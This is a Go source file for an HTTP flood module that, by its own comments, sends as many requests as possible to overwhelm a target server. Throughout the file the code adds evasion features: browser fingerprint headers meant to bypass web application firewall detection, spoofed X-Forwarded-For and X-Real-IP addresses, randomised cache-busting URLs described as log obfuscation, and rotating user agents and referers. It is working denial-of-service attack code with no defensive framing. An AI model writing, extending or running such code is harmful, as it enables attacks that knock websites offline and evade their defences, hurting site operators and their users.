package strategy

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"sync/atomic"
	"time"
)

// HTTPFlood implements high-volume HTTP request flooding.
// It sends as many HTTP requests as possible to overwhelm the target server.
type HTTPFlood struct {
	client            *http.Client
	timeout           time.Duration
	method            string
	postDataSize      int
	requestsPerConn   int
	activeConnections int64
	requestsSent      int64
	localAddr         *net.TCPAddr
	userAgents        []string
	referers          []string
	enableStealth     bool
	randomizePath     bool
	metricsCallback   MetricsCallback
}

var defaultReferers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.facebook.com/",
	"https://twitter.com/",
	"https://www.youtube.com/",
	"https://www.reddit.com/",
	"https://www.linkedin.com/",
}

var realisticReferers = []string{
	"google",
	"naver",
	"daum",
	"facebook",
	"direct",
	"bing",
	"yahoo",
	"twitter",
}

func NewHTTPFlood(timeout time.Duration, method string, postDataSize int, requestsPerConn int, bindIP string, enableStealth bool, randomizePath bool) *HTTPFlood {
	h := &HTTPFlood{
		timeout:         timeout,
		method:          method,
		postDataSize:    postDataSize,
		requestsPerConn: requestsPerConn,
		localAddr:       newLocalTCPAddr(bindIP),
		userAgents:      defaultUserAgents,
		referers:        defaultReferers,
		enableStealth:   enableStealth,
		randomizePath:   randomizePath,
	}

	transport := &http.Transport{
		MaxIdleConns:          100,
		MaxIdleConnsPerHost:   100,
		MaxConnsPerHost:       0,
		IdleConnTimeout:       90 * time.Second,
		DisableKeepAlives:     false,
		ExpectContinueTimeout: 1 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		dialer := &net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
			LocalAddr: h.localAddr,
		}
		conn, err := dialer.DialContext(ctx, network, addr)
		if err != nil {
			return nil, err
		}

		atomic.AddInt64(&h.activeConnections, 1)

		return NewTrackedConn(conn, func() {
			atomic.AddInt64(&h.activeConnections, -1)
		}), nil
	}

	h.client = &http.Client{
		Timeout:   timeout,
		Transport: transport,
	}

	return h
}

func (h *HTTPFlood) Execute(ctx context.Context, target Target) error {
	for i := 0; i < h.requestsPerConn; i++ {
		select {
		case <-ctx.Done():
			return nil
		default:
		}

		if err := h.sendRequest(ctx, target); err != nil {
			return err
		}
	}
	return nil
}

func (h *HTTPFlood) sendRequest(ctx context.Context, target Target) error {
	reqCtx, cancel := context.WithTimeout(ctx, h.timeout)
	defer cancel()

	var body io.Reader
	if h.method == "POST" && h.postDataSize > 0 {
		postData := h.generatePostData()
		body = bytes.NewReader(postData)
	}

	var targetURL string
	if h.randomizePath {
		targetURL = h.generateRealisticURL(target.URL)
	} else {
		targetURL = fmt.Sprintf("%s?r=%d&cb=%d", target.URL, rand.Intn(100000000), rand.Intn(1000000))
	}

	req, err := http.NewRequestWithContext(reqCtx, h.method, targetURL, body)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("User-Agent", h.userAgents[rand.Intn(len(h.userAgents))])
	req.Header.Set("Referer", h.referers[rand.Intn(len(h.referers))])
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Cache-Control", h.randomCacheControl())
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Connection", "keep-alive")

	if h.enableStealth {
		h.applyStealthHeaders(req)
	}

	if h.method == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	for k, v := range target.Headers {
		req.Header.Set(k, v)
	}

	startTime := time.Now()
	resp, err := h.client.Do(req)
	latency := time.Since(startTime)

	if err != nil {
		return fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, resp.Body)

	atomic.AddInt64(&h.requestsSent, 1)

	if h.metricsCallback != nil {
		h.metricsCallback.RecordSuccessWithLatency(latency)
	}

	return nil
}

// applyStealthHeaders adds modern browser fingerprint headers to bypass WAF detection.
// These headers (Sec-Fetch-*) are sent by Chrome/Edge browsers to identify legitimate requests.
func (h *HTTPFlood) applyStealthHeaders(req *http.Request) {
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", h.randomSecFetchSite())
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Sec-CH-UA", `"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"`)
	req.Header.Set("Sec-CH-UA-Mobile", "?0")
	req.Header.Set("Sec-CH-UA-Platform", h.randomPlatform())

	if rand.Float32() < 0.5 {
		fakeIP := fmt.Sprintf("%d.%d.%d.%d",
			rand.Intn(223)+1, rand.Intn(256), rand.Intn(256), rand.Intn(254)+1)
		req.Header.Set("X-Forwarded-For", fakeIP)
	}

	if rand.Float32() < 0.3 {
		req.Header.Set("X-Real-IP", fmt.Sprintf("%d.%d.%d.%d",
			rand.Intn(223)+1, rand.Intn(256), rand.Intn(256), rand.Intn(254)+1))
	}
}

func (h *HTTPFlood) randomSecFetchSite() string {
	sites := []string{"none", "same-origin", "same-site", "cross-site"}
	weights := []int{40, 30, 20, 10}
	total := 0
	for _, w := range weights {
		total += w
	}
	r := rand.Intn(total)
	cumulative := 0
	for i, w := range weights {
		cumulative += w
		if r < cumulative {
			return sites[i]
		}
	}
	return "none"
}

func (h *HTTPFlood) randomPlatform() string {
	platforms := []string{`"Windows"`, `"macOS"`, `"Linux"`}
	return platforms[rand.Intn(len(platforms))]
}

// generateRealisticURL creates a URL with realistic query parameters
// that mimic organic user traffic patterns for cache bypass and log obfuscation.
func (h *HTTPFlood) generateRealisticURL(baseURL string) string {
	u, err := url.Parse(baseURL)
	if err != nil {
		return fmt.Sprintf("%s?r=%d", baseURL, rand.Intn(100000000))
	}

	q := u.Query()

	q.Set("_", fmt.Sprintf("%d", time.Now().UnixMilli()))

	q.Set("r", fmt.Sprintf("%.8f", rand.Float64()))

	q.Set("ref", realisticReferers[rand.Intn(len(realisticReferers))])

	q.Set("v", fmt.Sprintf("%d", rand.Intn(100)+1))

	if rand.Float32() < 0.2 {
		q.Set("uid", fmt.Sprintf("%d", rand.Intn(90000)+10000))
	}

	if rand.Float32() < 0.15 {
		q.Set("session", h.generateSessionID())
	}

	if rand.Float32() < 0.25 {
		devices := []string{"desktop", "mobile", "tablet"}
		q.Set("device", devices[rand.Intn(len(devices))])
	}

	if rand.Float32() < 0.1 {
		utmSources := []string{"google", "facebook", "newsletter", "direct", "twitter"}
		q.Set("utm_source", utmSources[rand.Intn(len(utmSources))])
	}

	u.RawQuery = q.Encode()
	return u.String()
}

func (h *HTTPFlood) generateSessionID() string {
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
	result := make([]byte, 16)
	for i := range result {
		result[i] = chars[rand.Intn(len(chars))]
	}
	return string(result)
}

func (h *HTTPFlood) generatePostData() []byte {
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
	data := make([]byte, h.postDataSize)
	for i := range data {
		data[i] = chars[rand.Intn(len(chars))]
	}
	return data
}

func (h *HTTPFlood) randomCacheControl() string {
	options := []string{"no-cache", "max-age=0", "no-store", "must-revalidate"}
	return options[rand.Intn(len(options))]
}

func (h *HTTPFlood) Name() string {
	return "http-flood"
}

func (h *HTTPFlood) ActiveConnections() int64 {
	return atomic.LoadInt64(&h.activeConnections)
}

func (h *HTTPFlood) RequestsSent() int64 {
	return atomic.LoadInt64(&h.requestsSent)
}

func (h *HTTPFlood) SetMetricsCallback(callback MetricsCallback) {
	h.metricsCallback = callback
}
